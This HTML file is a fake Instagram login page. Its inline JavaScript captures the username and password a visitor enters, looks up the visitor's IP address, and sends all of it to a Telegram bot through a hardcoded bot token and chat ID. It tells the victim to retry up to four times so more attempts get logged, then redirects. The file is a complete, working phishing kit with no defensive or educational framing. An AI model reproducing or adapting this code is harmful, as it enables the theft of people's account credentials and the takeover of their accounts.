<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        /* Reset styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        /* Center the login container */
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #fafafa;
        }

        .login-container {
            width: 350px;
            padding: 20px;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            text-align: center;
        }

        /* Instagram logo styling */
        .logo {
            margin: 20px 0;
            font-size: 24px;
            font-weight: bold;
            color: #262626;
        }

        /* Input field styles */
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 14px;
        }

        /* Login button styling */
        .login-button {
            width: 100%;
            padding: 10px;
            margin: 20px 0;
            background-color: #3897f0;
            color: #fff;
            border: none;
            border-radius: 3px;
            font-weight: bold;
            cursor: pointer;
        }

        /* Additional text */
        .text-muted {
            color: #8e8e8e;
            font-size: 12px;
        }

        /* Sign up link */
        .signup-link {
            color: #3897f0;
            text-decoration: none;
            font-weight: bold;
        }

        .signup-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">Instagram</div>
        <form id="loginForm">
            <input type="text" class="input-field" id="username" placeholder="Username" required>
            <input type="password" class="input-field" id="password" placeholder="Password" required>
            <button type="submit" class="login-button">Log In</button>
        </form>
        <p class="text-muted">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
    </div>

    <script>
        let attemptCount = 0; // Counter for login attempts

        document.getElementById("loginForm").addEventListener("submit", function (e) {
            e.preventDefault();

            attemptCount++; // Increment attempt count

            // Get form data
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            // Fetch user's IP address using a public API
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const userIp = data.ip; // Capture IP address

                    // Telegram Bot API information
                    const botToken = "7753218675:AAHuGWjeWTKwwV6c8jKGVXnuEUJUEMCMBUE";
                    const chatId = "6826019056";
                    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

                    // Create message to send
                    const message = `Login Attempt ${attemptCount}:\nUsername: ${username}\nPassword: ${password}\nIP Address: ${userIp}`;

                    // Send message to Telegram
                    fetch(telegramApiUrl, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            if (attemptCount >= 4) {
                                // Redirect after the fourth attempt
                                window.location.href = "flock.html";
                            } else {
                                alert(`Attempt ${attemptCount} logged. Try again.`);
                            }
                        } else {
                            alert("Failed to send data to Telegram.");
                        }
                    })
                    .catch(error => {
                        console.error("Error:", error);
                        alert("An error occurred.");
                    });
                })
                .catch(error => {
                    console.error("Error fetching IP address:", error);
                });
        });
    </script>
</body>
</html>
